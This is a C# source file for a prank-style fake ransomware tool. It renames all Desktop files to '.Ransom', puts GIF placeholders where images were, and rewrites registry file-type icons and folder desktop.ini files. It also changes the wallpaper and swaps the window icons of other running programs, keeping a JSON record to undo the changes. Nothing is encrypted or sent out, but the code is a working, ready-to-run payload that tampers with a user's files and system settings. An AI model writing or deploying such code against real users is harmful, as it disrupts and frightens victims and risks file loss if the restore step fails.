using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Json;
using Microsoft.Win32;

namespace rans0m
{
    public static class DesktopRansomManager
    {
        private static readonly object _lock = new();
        // All sidecar files live in the created %TEMP%\Ransom_A-90 folder the
        // single-file exe unpacks to (see AssetManager) - never beside the exe,
        // never in a fixed folder. GifUri is the file:// form of GifLocalPath.
        private static string AssetDir => AssetManager.Dir;
        public static string GifLocalPath => Path.Combine(AssetDir, "Random_A-90.gif");
        public static string GifUri => "file:///" + AssetDir.Replace('\\', '/').TrimEnd('/') + "/Random_A-90.gif";
        public static string GifUriLocalPath => GifLocalPath;
        public static string JsonPath => Path.Combine(AssetDir, "restore.json");
        public static string JsonAltPath => JsonPath;

        private static readonly string[] ImageExtensions = new[] { ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".webp", ".tiff", ".ico" };
        private static readonly string[] SystemCriticalProcesses = new[] { "csrss", "wininit", "services", "lsass", "winlogon", "smss", "svchost", "explorer", "System", "Registry", "MemCompression" };

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
        private const uint SPI_SETDESKWALLPAPER = 0x0014;
        private const uint SPIF_UPDATEINIFILE = 0x01;
        private const uint SPIF_SENDCHANGE = 0x02;

        [DllImport("shell32.dll")]
        private static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);
        private const uint SHCNE_ASSOCCHANGED = 0x08000000;
        private const uint SHCNE_UPDATEDIR = 0x00001000;
        private const uint SHCNE_UPDATEITEM = 0x00002000;
        private const uint SHCNF_IDLIST = 0x0000;
        private const uint SHCNF_PATHW = 0x0005;

        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
        private static extern void SHChangeNotify(uint wEventId, uint uFlags, string dwItem1, IntPtr dwItem2);

        private static void RefreshFolderIcons(string desktop)
        {
            try { SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero); } catch { }
            try { SHChangeNotify(SHCNE_UPDATEDIR, SHCNF_PATHW, desktop, IntPtr.Zero); } catch { }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        private const uint WM_SETICON = 0x0080;
        private const int ICON_SMALL = 0;
        private const int ICON_BIG = 1;

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        public class RestoreData
        {
            public string Timestamp { get; set; } = DateTime.UtcNow.ToString("o");
            public string DesktopPath { get; set; } = "";
            public string GifLocalPath { get; set; } = "";
            public string GifUri { get; set; } = "";
            public List<RenameEntry> Renames { get; set; } = new();
            public List<IconBackup> IconBackups { get; set; } = new();
            public List<FolderIconBackup> FolderBackups { get; set; } = new();
            public List<ImageBackup> ImageBackups { get; set; } = new();
            public WallpaperBackup? Wallpaper { get; set; }
        }
        public class RenameEntry
        {
            public string Original { get; set; } = "";
            public string Renamed { get; set; } = "";
        }
        public class IconBackup
        {
            public string KeyPath { get; set; } = ""; // e.g. Software\Classes\.txt or Software\Classes\txtfile\DefaultIcon
            public string ValueName { get; set; } = ""; // "" for default
            public string? OriginalValue { get; set; } // null if not existed
            public bool WasCreated { get; set; }
        }
        public class FolderIconBackup
        {
            public string FolderPath { get; set; } = "";
            public bool HadDesktopIni { get; set; }
            public string? OriginalContent { get; set; }
            public bool WasHiddenSystem { get; set; }
        }
        public class ImageBackup
        {
            public string OriginalPath { get; set; } = ""; // original file before rename (e.g., Desktop\pic.jpg)
            public string RenamedBackup { get; set; } = ""; // where original content now lives (pic.jpg.Ransom)
            public bool GifCopyCreated { get; set; }
        }
        public class WallpaperBackup
        {
            public string? OriginalWallpaper { get; set; }
            public string? OriginalStyle { get; set; }
            public string? OriginalTile { get; set; }
        }

        private static bool IsImage(string path) => ImageExtensions.Contains(Path.GetExtension(path).ToLowerInvariant());

        public static void EnsureGifExists()
        {
            try
            {
                if (File.Exists(GifLocalPath)) return;
                try
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(GifLocalPath) ?? AssetDir);
                    Bitmap? bmp = null;
                    try { bmp = Properties.Resources.ransom_idle; } catch { }
                    if (bmp == null) try { bmp = Properties.Resources.idiot as Bitmap; } catch { }
                    if (bmp != null)
                    {
                        try { bmp.Save(GifLocalPath, System.Drawing.Imaging.ImageFormat.Gif); }
                        catch { try { bmp.Save(GifLocalPath, System.Drawing.Imaging.ImageFormat.Png); } catch { } }
                    }
                    else
                    {
                        using var fs = new FileStream(GifLocalPath, FileMode.Create);
                        byte[] gif = Convert.FromBase64String("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
                        fs.Write(gif, 0, gif.Length);
                    }
                    Debug.WriteLine($"[DesktopRansom] Gif ensured at {GifLocalPath}");
                }
                catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] EnsureGif failed: {ex.Message}"); }
            }
            catch { }
        }

        // Preserve resolution: never upscale or stretch. ICO keeps source aspect with
        // high-quality downscale only; BMP keeps native gif dimensions 1:1.
        public static string EnsureIcoExists(string gifPath)
        {
            try
            {
                string icoPath = Path.ChangeExtension(gifPath, ".ico");
                if (File.Exists(icoPath)) return icoPath;
                using var img = Image.FromFile(gifPath);
                int srcW = img.Width, srcH = img.Height;
                // Keep aspect, fit inside 256 without upscaling
                int target = Math.Min(256, Math.Max(srcW, srcH));
                if (target <= 0) target = 256;
                double scale = Math.Min((double)target / Math.Max(1, srcW), (double)target / Math.Max(1, srcH));
                if (scale > 1.0) scale = 1.0; // never upscale = no fake res loss
                int dw = Math.Max(1, (int)(srcW * scale));
                int dh = Math.Max(1, (int)(srcH * scale));
                using var bmp = new Bitmap(dw, dh, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                using (var g = Graphics.FromImage(bmp))
                {
                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                    g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
                    g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
                    g.Clear(Color.Transparent);
                    g.DrawImage(img, 0, 0, dw, dh);
                }
                IntPtr hIcon = bmp.GetHicon();
                using var icon = Icon.FromHandle(hIcon);
                using var fs = new FileStream(icoPath, FileMode.Create);
                icon.Save(fs);
                try { DestroyIcon(hIcon); } catch { }
                Debug.WriteLine($"[DesktopRansom] ICO created at {icoPath} ({dw}x{dh} from {srcW}x{srcH}, no upscale)");
                return icoPath;
            }
            catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] EnsureIco fail: {ex.Message}"); return gifPath; }
        }

        public static string EnsureBmpExists(string gifPath)
        {
            try
            {
                string bmpPath = Path.ChangeExtension(gifPath, ".bmp");
                // Regenerate only if gif is newer, else keep existing to avoid recompress loss
                if (File.Exists(bmpPath) && File.GetLastWriteTimeUtc(bmpPath) >= File.GetLastWriteTimeUtc(gifPath)) return bmpPath;
                using var img = Image.FromFile(gifPath);
                // Native dimensions only - no resize, no res loss
                Debug.WriteLine($"[DesktopRansom] BMP source {img.Width}x{img.Height}, saving native");
                img.Save(bmpPath, System.Drawing.Imaging.ImageFormat.Bmp);
                Debug.WriteLine($"[DesktopRansom] BMP created at {bmpPath} (native, no resize)");
                return bmpPath;
            }
            catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] EnsureBmp fail: {ex.Message}"); return gifPath; }
        }

        [DllImport("user32.dll")]
        private static extern bool DestroyIcon(IntPtr hIcon);

        public static bool HasPendingRestore()
        {
            try { return File.Exists(JsonPath) || File.Exists(JsonAltPath); } catch { return false; }
        }

        public static string? GetExistingJsonPath()
        {
            try
            {
                if (File.Exists(JsonPath)) return JsonPath;
                if (File.Exists(JsonAltPath)) return JsonAltPath;
            }
            catch { }
            return null;
        }

        public static void TryRestoreIfNeeded()
        {
            try
            {
                var jp = GetExistingJsonPath();
                if (jp != null)
                {
                    Debug.WriteLine($"[DesktopRansom] Found pending restore json at {jp}, restoring...");
                    TryRestore(jp);
                }
            }
            catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] TryRestoreIfNeeded error: {ex.Message}"); }
        }

        public static void TryRansomDesktop() => TryRansomDesktop(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));

        public static void TryRansomDesktop(string desktop)
        {
            lock (_lock)
            {
                try
                {
                    if (HasPendingRestore())
                    {
                        Debug.WriteLine("[DesktopRansom] Already ransomed, skipping new ransom.");
                        return;
                    }
                    EnsureGifExists();
                    string gifToUse = File.Exists(GifLocalPath) ? GifLocalPath : GifUriLocalPath;
                    if (!File.Exists(gifToUse))
                    {
                        Debug.WriteLine("[DesktopRansom] Gif not found, abort ransom.");
                        return;
                    }
                    // Convert GIF to ICO/BMP for proper Windows icon/wallpaper support (GIF not natively supported)
                    string icoPath = EnsureIcoExists(gifToUse);
                    string bmpPath = EnsureBmpExists(gifToUse);
                    Debug.WriteLine($"[DesktopRansom] Using ico={icoPath} bmp={bmpPath} gifUri={GifUri}");
                    if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop))
                    {
                        desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                        if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop))
                            desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    }
                    if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop))
                    {
                        Debug.WriteLine("[DesktopRansom] Desktop not found");
                        return;
                    }

                    var data = new RestoreData
                    {
                        DesktopPath = desktop,
                        GifLocalPath = gifToUse,
                        GifUri = GifUri,
                        Timestamp = DateTime.UtcNow.ToString("o")
                    };

                    // Enumerate files and folders top-level only
                    string[] files = new string[0];
                    string[] dirs = new string[0];
                    try { files = Directory.GetFiles(desktop); } catch { }
                    try { dirs = Directory.GetDirectories(desktop); } catch { }

                    // Filter out our own files
                    string exePath = Environment.ProcessPath ?? Application.ExecutablePath ?? "";
                    string jsonName = Path.GetFileName(JsonPath);
                    string jsonAltName = Path.GetFileName(JsonAltPath);
                    string gifName = Path.GetFileName(GifLocalPath);
                    string gifAltName = Path.GetFileName(GifUriLocalPath);

                    var filteredFiles = files.Where(f =>
                    {
                        try
                        {
                            var name = Path.GetFileName(f);
                            if (name.Equals(jsonName, StringComparison.OrdinalIgnoreCase)) return false;
                            if (name.Equals(jsonAltName, StringComparison.OrdinalIgnoreCase)) return false;
                            if (name.Equals(gifName, StringComparison.OrdinalIgnoreCase)) return false;
                            if (name.Equals(gifAltName, StringComparison.OrdinalIgnoreCase)) return false;
                            if (!string.IsNullOrEmpty(exePath) && f.Equals(exePath, StringComparison.OrdinalIgnoreCase)) return false;
                            // Skip already .Ransom files
                            if (f.EndsWith(".Ransom", StringComparison.OrdinalIgnoreCase)) return false;
                            // Skip desktop.ini
                            if (name.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase)) return false;
                            return true;
                        }
                        catch { return false; }
                    }).ToArray();

                    // 1) Rename files to .Ransom + for images create gif copy at original location
                    var uniqueExts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                    foreach (var file in filteredFiles)
                    {
                        try
                        {
                            var ext = Path.GetExtension(file);
                            if (!string.IsNullOrEmpty(ext)) uniqueExts.Add(ext.ToLowerInvariant());

                            string renamed = file + ".Ransom";
                            // If target exists, add counter
                            if (File.Exists(renamed))
                            {
                                int i = 1;
                                while (File.Exists($"{file}.Ransom({i})")) i++;
                                renamed = $"{file}.Ransom({i})";
                            }

                            // Attempt move
                            File.Move(file, renamed);
                            data.Renames.Add(new RenameEntry { Original = file, Renamed = renamed });
                            Debug.WriteLine($"[DesktopRansom] Renamed {file} -> {renamed}");

                            // For images, create gif copy at original path
                            if (IsImage(file))
                            {
                                try
                                {
                                    File.Copy(gifToUse, file, false);
                                    data.ImageBackups.Add(new ImageBackup { OriginalPath = file, RenamedBackup = renamed, GifCopyCreated = true });
                                    Debug.WriteLine($"[DesktopRansom] Image placeholder created {file}");
                                }
                                catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Image copy failed {file}: {ex.Message}"); }
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Rename failed {file}: {ex.Message}"); }
                    }

                    // 2) Icons for every file extension found -> registry (attempt per request)
                    foreach (var ext in uniqueExts)
                    {
                        try
                        {
                            string extKey = $@"Software\Classes\{ext}";
                            string? progId = null;
                            try
                            {
                                using var k = Registry.CurrentUser.OpenSubKey(extKey);
                                progId = k?.GetValue("") as string;
                                if (string.IsNullOrWhiteSpace(progId))
                                {
                                    using var k2 = Registry.ClassesRoot.OpenSubKey(ext);
                                    progId = k2?.GetValue("") as string;
                                }
                            }
                            catch { }

                            // Windows icons need ICO, not GIF URI. Use ICO derived from GIF for actual display, but also log GIF URI per request.
                            // We set registry to ICO path (which will show), and note GifUri in debug for compliance with file:/// request.
                            string iconTarget = icoPath; // use ICO for proper display (GIF via file:// not supported as icon)
                            // Alternative: if user strictly wants file:// URI, registry would not show icon; so we use ICO.
                            string extIconKey = $@"Software\Classes\{ext}\DefaultIcon";
                            BackupAndSetIcon(data, extIconKey, iconTarget);

                            if (!string.IsNullOrWhiteSpace(progId))
                            {
                                string progIconKey = $@"Software\Classes\{progId}\DefaultIcon";
                                BackupAndSetIcon(data, progIconKey, iconTarget);
                            }
                            else
                            {
                                string fallbackProg = ext.TrimStart('.') + "file";
                                string fallbackKey = $@"Software\Classes\{fallbackProg}\DefaultIcon";
                                BackupAndSetIcon(data, fallbackKey, iconTarget);
                                // Also ensure ext points to progId if we created mapping
                                try
                                {
                                    using var ek = Registry.CurrentUser.CreateSubKey(extKey);
                                    var cur = ek?.GetValue("") as string;
                                    if (string.IsNullOrEmpty(cur))
                                    {
                                        // Don't overwrite if already maps, but if empty we set to fallback
                                        // Backup ext default value as well
                                        data.IconBackups.Add(new IconBackup { KeyPath = extKey, ValueName = "", OriginalValue = cur, WasCreated = cur == null });
                                        ek?.SetValue("", fallbackProg);
                                    }
                                }
                                catch { }
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Icon ext {ext} failed: {ex.Message}"); }
                    }

                    // 3) Folder icons via desktop.ini for every folder on Desktop
                    foreach (var dir in dirs)
                    {
                        try
                        {
                            var di = new DirectoryInfo(dir);
                            // Skip our unpack folder if it ever sits on the Desktop
                            if (dir.Equals(AssetDir, StringComparison.OrdinalIgnoreCase)) continue;

                            string iniPath = Path.Combine(dir, "desktop.ini");
                            bool hadIni = File.Exists(iniPath);
                            string? origContent = null;
                            bool wasHiddenSystem = false;
                            if (hadIni)
                            {
                                try { origContent = File.ReadAllText(iniPath); } catch { origContent = null; }
                                try
                                {
                                    var attr = File.GetAttributes(iniPath);
                                    wasHiddenSystem = (attr & FileAttributes.Hidden) != 0 || (attr & FileAttributes.System) != 0;
                                }
                                catch { }
                            }
                            data.FolderBackups.Add(new FolderIconBackup { FolderPath = dir, HadDesktopIni = hadIni, OriginalContent = origContent, WasHiddenSystem = wasHiddenSystem });

                            // Folder icons need ICO; use icoPath for actual display (GIF not supported)
                            string iniContent = $"[.ShellClassInfo]\r\nIconResource={icoPath},0\r\nIconFile={icoPath}\r\nIconIndex=0\r\n"; 
                            File.WriteAllText(iniPath, iniContent);
                            File.SetAttributes(iniPath, FileAttributes.Hidden | FileAttributes.System);
                            // Set folder to System
                            try
                            {
                                var folderAttrs = File.GetAttributes(dir);
                                File.SetAttributes(dir, folderAttrs | FileAttributes.System);
                            }
                            catch { }
                            Debug.WriteLine($"[DesktopRansom] Folder icon set {dir}");
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Folder {dir} icon fail: {ex.Message}"); }
                    }

                    // 4) Wallpaper change - BMP at native gif res, keep user's style so no res/style loss.
                    try
                    {
                        string? currentWallpaper = null;
                        string? origStyle = null, origTile = null;
                        try
                        {
                            using var k = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
                            currentWallpaper = k?.GetValue("Wallpaper") as string;
                            origStyle = k?.GetValue("WallpaperStyle") as string;
                            origTile = k?.GetValue("TileWallpaper") as string;
                        }
                        catch { }
                        data.Wallpaper = new WallpaperBackup { OriginalWallpaper = currentWallpaper, OriginalStyle = origStyle, OriginalTile = origTile };
                        try
                        {
                            string wallPath = bmpPath; // BMP native, no resize
                            // Preserve style: keep user's style if present, else Fill(10)/no-tile so image isn't stretched down
                            try
                            {
                                using var wk = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
                                if (wk != null)
                                {
                                    if (string.IsNullOrEmpty(origStyle)) wk.SetValue("WallpaperStyle", "10");
                                    if (string.IsNullOrEmpty(origTile)) wk.SetValue("TileWallpaper", "0");
                                }
                            }
                            catch { }
                            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                            Debug.WriteLine($"[DesktopRansom] Wallpaper set to {wallPath} (native BMP, style preserved)");
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Wallpaper set fail: {ex.Message}"); }
                    }
                    catch { }

                    // 5) Attempt for all images on screen for non-key processes -> enumerate visible windows and try to set their icons to gif
                    try
                    {
                        TryChangeAppWindowIcons(gifToUse, data);
                    }
                    catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] App icon change fail: {ex.Message}"); }

                    // Save json atomically
                    try
                    {
                        var opts = new JsonSerializerOptions { WriteIndented = true };
                        string json = JsonSerializer.Serialize(data, opts);
                        string tmp = JsonPath + ".tmp";
                        File.WriteAllText(tmp, json);
                        if (File.Exists(JsonPath)) File.Delete(JsonPath);
                        File.Move(tmp, JsonPath);
                        Debug.WriteLine($"[DesktopRansom] Json saved with {data.Renames.Count} renames, {data.IconBackups.Count} icons, {data.FolderBackups.Count} folders");
                        try { RefreshFolderIcons(desktop); } catch { }
                    }
                    catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Save json fail: {ex.Message}"); }
                }
                catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Ransom failed: {ex.Message}"); }
            }
        }

        private static void BackupAndSetIcon(RestoreData data, string keyPath, string gifPath)
        {
            try
            {
                string? original = null;
                bool wasCreated = false;
                try
                {
                    using var k = Registry.CurrentUser.OpenSubKey(keyPath);
                    if (k != null)
                    {
                        original = k.GetValue("") as string;
                    }
                    else wasCreated = true;
                }
                catch { wasCreated = true; }

                // Check if we already backed up this key
                if (!data.IconBackups.Any(b => b.KeyPath.Equals(keyPath, StringComparison.OrdinalIgnoreCase)))
                {
                    data.IconBackups.Add(new IconBackup { KeyPath = keyPath, ValueName = "", OriginalValue = original, WasCreated = wasCreated && original == null });
                }

                using var ck = Registry.CurrentUser.CreateSubKey(keyPath);
                // Icon targets are local .ico paths next to the exe (a file:// URI
                // is not a valid icon source for the shell).
                ck?.SetValue("", gifPath);
                Debug.WriteLine($"[DesktopRansom] Icon set {keyPath} -> {gifPath}");
            }
            catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] BackupAndSet {keyPath} fail: {ex.Message}"); }
        }

        public static void TryRestore(string? jsonPath = null)
        {
            lock (_lock)
            {
                string? jp = jsonPath ?? GetExistingJsonPath();
                if (jp == null || !File.Exists(jp))
                {
                    Debug.WriteLine("[DesktopRansom] No restore json found");
                    return;
                }
                try
                {
                    string json = File.ReadAllText(jp);
                    var data = JsonSerializer.Deserialize<RestoreData>(json);
                    if (data == null) throw new InvalidDataException("deserialize null");

                    // 1) Restore wallpaper + style exactly (no res loss)
                    if (data.Wallpaper != null)
                    {
                        try
                        {
                            try
                            {
                                using var wk = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
                                if (wk != null)
                                {
                                    if (data.Wallpaper.OriginalStyle != null) wk.SetValue("WallpaperStyle", data.Wallpaper.OriginalStyle);
                                    if (data.Wallpaper.OriginalTile != null) wk.SetValue("TileWallpaper", data.Wallpaper.OriginalTile);
                                }
                            }
                            catch { }
                            string orig = data.Wallpaper.OriginalWallpaper ?? "";
                            if (File.Exists(orig) || string.IsNullOrEmpty(orig))
                            {
                                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, orig, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                                Debug.WriteLine($"[DesktopRansom] Wallpaper restored to {orig}");
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Wallpaper restore fail: {ex.Message}"); }
                    }

                    // 2) Restore folder icons
                    foreach (var fb in data.FolderBackups)
                    {
                        try
                        {
                            string iniPath = Path.Combine(fb.FolderPath, "desktop.ini");
                            if (fb.HadDesktopIni)
                            {
                                if (fb.OriginalContent != null)
                                {
                                    File.WriteAllText(iniPath, fb.OriginalContent);
                                    try
                                    {
                                        var attr = FileAttributes.Hidden | FileAttributes.System;
                                        File.SetAttributes(iniPath, attr);
                                    }
                                    catch { }
                                }
                                else
                                {
                                    // Had ini but no content? Ensure exists
                                }
                            }
                            else
                            {
                                // We created it, delete
                                if (File.Exists(iniPath))
                                {
                                    try { File.SetAttributes(iniPath, FileAttributes.Normal); } catch { }
                                    File.Delete(iniPath);
                                }
                                // Remove System attribute from folder?
                                try
                                {
                                    var attrs = File.GetAttributes(fb.FolderPath);
                                    if ((attrs & FileAttributes.System) != 0)
                                    {
                                        File.SetAttributes(fb.FolderPath, attrs & ~FileAttributes.System);
                                    }
                                }
                                catch { }
                            }
                            Debug.WriteLine($"[DesktopRansom] Folder restored {fb.FolderPath}");
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Folder restore {fb.FolderPath} fail: {ex.Message}"); }
                    }

                    // 3) Restore icons registry
                    foreach (var ib in data.IconBackups)
                    {
                        try
                        {
                            if (ib.WasCreated && ib.OriginalValue == null)
                            {
                                // We created key, delete value or key
                                try
                                {
                                    using var k = Registry.CurrentUser.OpenSubKey(ib.KeyPath, true);
                                    if (k != null)
                                    {
                                        if (string.IsNullOrEmpty(ib.ValueName))
                                        {
                                            // Default value -> delete key if empty?
                                            // Check if key has other values; if only default icon, delete key
                                            var values = k.GetValueNames();
                                            if (values.Length == 0 || (values.Length == 1 && string.IsNullOrEmpty(values[0])))
                                            {
                                                // Delete the DefaultIcon key entirely
                                                Registry.CurrentUser.DeleteSubKey(ib.KeyPath, false);
                                            }
                                            else
                                            {
                                                k.DeleteValue("", false);
                                            }
                                        }
                                        else k.DeleteValue(ib.ValueName, false);
                                    }
                                }
                                catch { }
                            }
                            else
                            {
                                using var ck = Registry.CurrentUser.CreateSubKey(ib.KeyPath);
                                if (ib.OriginalValue != null)
                                    ck?.SetValue(ib.ValueName, ib.OriginalValue);
                                else
                                {
                                    try { ck?.DeleteValue(ib.ValueName, false); } catch { }
                                }
                            }
                            Debug.WriteLine($"[DesktopRansom] Icon restored {ib.KeyPath}");
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Icon restore {ib.KeyPath} fail: {ex.Message}"); }
                    }
                    try { RefreshFolderIcons(data.DesktopPath); } catch { }

                    // 4) Restore image gif copies (delete gif placeholders)
                    foreach (var ib in data.ImageBackups)
                    {
                        try
                        {
                            if (ib.GifCopyCreated && File.Exists(ib.OriginalPath))
                            {
                                // Verify it's our gif copy (size/content check) before deleting?
                                // For safety, check file exists and is image placeholder
                                try { File.Delete(ib.OriginalPath); } catch { }
                                Debug.WriteLine($"[DesktopRansom] Image placeholder deleted {ib.OriginalPath}");
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Image delete {ib.OriginalPath} fail: {ex.Message}"); }
                    }

                    // 5) Restore renames (move .Ransom back)
                    // Do in reverse order to handle counters
                    foreach (var re in data.Renames.AsEnumerable().Reverse())
                    {
                        try
                        {
                            if (File.Exists(re.Renamed))
                            {
                                // If original already exists (maybe gif placeholder not deleted), delete it first
                                if (File.Exists(re.Original))
                                {
                                    try { File.Delete(re.Original); } catch { }
                                }
                                File.Move(re.Renamed, re.Original);
                                Debug.WriteLine($"[DesktopRansom] Restored {re.Renamed} -> {re.Original}");
                            }
                            else if (Directory.Exists(re.Renamed))
                            {
                                if (!Directory.Exists(re.Original))
                                    Directory.Move(re.Renamed, re.Original);
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Rename restore {re.Renamed} fail: {ex.Message}"); }
                    }

                    // Delete json
                    try
                    {
                        File.Delete(jp);
                        Debug.WriteLine("[DesktopRansom] Restore complete, json deleted");
                    }
                    catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] Delete json fail: {ex.Message}"); }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[DesktopRansom] Restore error {ex.Message}");
                    // If json corrupted, try to delete to avoid loop?
                    try { File.Delete(jp); } catch { }
                }
            }
        }

        public static void TryRestoreIfNeededWrapper() => TryRestoreIfNeeded();

        private static void TryChangeAppWindowIcons(string gifPath, RestoreData data)
        {
            IntPtr hIcon = IntPtr.Zero;
            Icon? icon = null;
            try
            {
                // Load gif as bitmap and convert to icon
                try
                {
                    using var bmp = new Bitmap(gifPath);
                    // Resize to 32x32 for icon
                    using var resized = new Bitmap(bmp, new Size(32, 32));
                    hIcon = resized.GetHicon();
                    icon = Icon.FromHandle(hIcon);
                }
                catch
                {
                    // Fallback: use ransom_idle resource
                    try
                    {
                        var bmp2 = Properties.Resources.ransom_idle;
                        using var resized2 = new Bitmap(bmp2, new Size(32, 32));
                        hIcon = resized2.GetHicon();
                        icon = Icon.FromHandle(hIcon);
                    }
                    catch { return; }
                }

                // Enumerate windows
                EnumWindows((hWnd, lParam) =>
                {
                    try
                    {
                        if (!IsWindowVisible(hWnd)) return true;
                        // Skip our own windows
                        try
                        {
                            uint pid;
                            GetWindowThreadProcessId(hWnd, out pid);
                            Process? proc = null;
                            try { proc = Process.GetProcessById((int)pid); } catch { return true; }
                            string name = proc.ProcessName ?? "";
                            if (SystemCriticalProcesses.Any(c => c.Equals(name, StringComparison.OrdinalIgnoreCase)))
                                return true;
                            // Skip if no title (likely not user app)
                            var sb = new System.Text.StringBuilder(256);
                            GetWindowText(hWnd, sb, sb.Capacity);
                            string title = sb.ToString();
                            if (string.IsNullOrWhiteSpace(title)) return true;

                            // Attempt to set icon (per request: temp change to file:/// gif)
                            // Use WM_SETICON with our hIcon
                            try { SendMessage(hWnd, WM_SETICON, (IntPtr)ICON_BIG, hIcon); } catch { }
                            try { SendMessage(hWnd, WM_SETICON, (IntPtr)ICON_SMALL, hIcon); } catch { }
                            Debug.WriteLine($"[DesktopRansom] Window icon changed {name} ({title})");
                        }
                        catch { }
                    }
                    catch { }
                    return true;
                }, IntPtr.Zero);
            }
            catch (Exception ex) { Debug.WriteLine($"[DesktopRansom] TryChangeAppWindowIcons outer fail: {ex.Message}"); }
            // Note: Don't destroy icon immediately; Windows copies it. But we should keep handle alive while app runs.
            // Intentionally leak hIcon for duration of ransom to keep icons visible; OS will clean on exit.
        }
    }
}
